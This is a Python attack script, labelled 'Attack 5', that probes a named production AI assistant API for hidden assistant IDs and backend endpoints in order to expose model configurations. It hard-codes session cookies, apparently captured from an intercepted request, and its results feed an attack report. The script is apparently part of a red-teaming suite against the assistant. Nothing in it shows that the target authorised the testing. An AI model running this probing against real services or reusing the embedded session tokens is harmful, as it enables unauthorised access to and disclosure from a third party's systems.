"""
Attack 5: /bff/assistant Endpoint Probing

Probes for other assistant IDs and configurations.
The target exposed assistant_1's full config (model, temperature, max_tokens).
Let's see if there are others.
"""
import sys
sys.path.insert(0, ".")

import json
import time
import httpx

# Session cookies from the fresh Burp request
COOKIES = "_ga=GA1.1.312775884.1738882234; _ga_XP5LRE15RF=GS2.1.s1748620539$o1$g1$t1748622572$j60$l0$h0; _ga_MBJWFFL44R=GS2.1.s1748622573$o3$g0$t1748622573$j60$l0$h0; AppSession=2A3D6656-449F-11F1-AF41-715B0B75FAC6; __fipid-isso-prod=HB7gCgk98ceQIasjDg-gpptNqBo.*AAJTSQACMDIAAlNLABxBakZqa0lvL0taSU9pL0Z1b2hBWnVOVGFpVVE9AAR0eXBlAANDVFMAAlMxAAIwMQ..*; amlbcookie=01; fillip_session_id=kABOiD4-SHZk4wCc2ujchJ7Z3e5WlGku6Qew54PfBCM"

BASE_URL = "https://api.fillip.finra.org"

HEADERS = {
    "Cookie": COOKIES,
    "Accept": "*/*",
    "Origin": "https://fillip.finra.org",
    "Referer": "https://fillip.finra.org/",
}

# Assistant IDs to probe
ASSISTANT_IDS = [
    "assistant_1",
    "assistant_2",
    "assistant_3",
    "assistant_0",
    "assistant_admin",
    "assistant_test",
    "assistant_dev",
    "assistant_debug",
    "assistant_internal",
    "assistant_default",
    "admin",
    "default",
    "test",
    "system",
]

# Endpoints to probe
ENDPOINTS = [
    "/bff/assistant",
    "/bff/assistants",
    "/bff/config",
    "/bff/health",
    "/bff/status",
    "/bff/version",
    "/bff/models",
    "/bff/tools",
    "/bff/user",
    "/bff/sessions",
]


def probe_endpoint(path, params=None):
    """Send GET request to an endpoint."""
    try:
        with httpx.Client(timeout=10.0, follow_redirects=True) as client:
            response = client.get(f"{BASE_URL}{path}", headers=HEADERS, params=params)
            return response.status_code, response.text[:500]
    except Exception as e:
        return 0, str(e)


def probe_assistant(assistant_id):
    """Probe a specific assistant ID."""
    # Try as query param
    status, body = probe_endpoint("/bff/assistant", params={"assistant_id": assistant_id})
    if status == 200 and len(body) > 10:
        return status, body

    # Try as path
    status, body = probe_endpoint(f"/bff/assistant/{assistant_id}")
    if status == 200 and len(body) > 10:
        return status, body

    return status, body


print("[+] Probing /bff/assistant endpoint for other configurations")
print("=" * 80)

print("\n[Phase 1] Probing assistant IDs:")
results = []

for aid in ASSISTANT_IDS:
    status, body = probe_assistant(aid)
    if status == 200 and "model" in body:
        print(f"  🔴 {aid} -> {status} FOUND CONFIG:")
        try:
            data = json.loads(body)
            if isinstance(data, list):
                for item in data:
                    print(f"      {json.dumps(item, indent=6)[:300]}")
            else:
                print(f"      {json.dumps(data, indent=6)[:300]}")
        except json.JSONDecodeError:
            print(f"      {body[:300]}")
        results.append({"id": aid, "name": f"assistant/{aid}", "status": "DISCLOSED", "payload": f"GET /bff/assistant?assistant_id={aid}", "response": body[:600], "strategy": "endpoint_probe"})
    elif status == 200:
        print(f"  🟡 {aid} -> {status} (response but no model config): {body[:100]}")
        results.append({"id": aid, "name": f"assistant/{aid}", "status": "NORMAL", "payload": f"GET /bff/assistant?assistant_id={aid}", "response": body[:300], "strategy": "endpoint_probe"})
    elif status == 404:
        print(f"  ➖ {aid} -> 404")
    else:
        print(f"  ➖ {aid} -> {status}: {body[:80]}")
    time.sleep(1)

print(f"\n[Phase 2] Probing other endpoints:")
for endpoint in ENDPOINTS:
    status, body = probe_endpoint(endpoint)
    if status == 200:
        print(f"  🟡 {endpoint} -> {status}: {body[:200]}")
    elif status != 404:
        print(f"  ➖ {endpoint} -> {status}: {body[:80]}")
    else:
        print(f"  ➖ {endpoint} -> 404")
    time.sleep(1)

print("\n[+] Done.")

# Generate HTML report
from attack_reporter import generate_attack_report
generate_attack_report("Endpoint Probing", results)
